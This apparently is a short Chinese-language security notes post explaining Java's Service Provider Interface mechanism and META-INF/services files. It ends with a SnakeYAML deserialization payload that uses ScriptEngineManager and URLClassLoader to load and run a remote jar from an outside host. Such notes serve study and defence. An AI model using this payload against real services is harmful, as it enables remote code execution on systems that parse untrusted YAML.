---
title: "SPI"
author: ["4shen0ne"]
tags: ["java"]
draft: false
---

SPI（Service Provider Interface），是 JDK 内置的一种服务提供发现机制，可以用来启用
框架扩展和替换组件，主要是被框架的开发人员使用，比如 `java.sql.Driver` 接口，其他
不同厂商可以针对同一接口做出不同的实现，MySQL 和 PostgreSQL 都有不同的实现提供给用
户，而 Java 的 SPI 机制可以为某个接口寻找服务实现。Java 中 SPI 机制主要思想是将装配的控
制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是解耦。

当服务的提供者提供了一种接口的实现之后，需要在 classpath 下的 `META-INF/services/`
目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。
当其他的程序需要这个服务的时候，就可以通过查找这个 jar 包（一般都是以 jar 包做依赖）
的 `META-INF/services/` 中的配置文件，配置文件中有接口的具体实现类名，可以根据这个
类名进行加载实例化，就可以使用该服务了。

相关利用：SnakeYaml 反序列化链利用 ScriptEngineManager 通过 SPI 远程加载 jar 包

```nil
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://1.1.1.1:80/yaml-payload.jar"]
  ]]
]
```
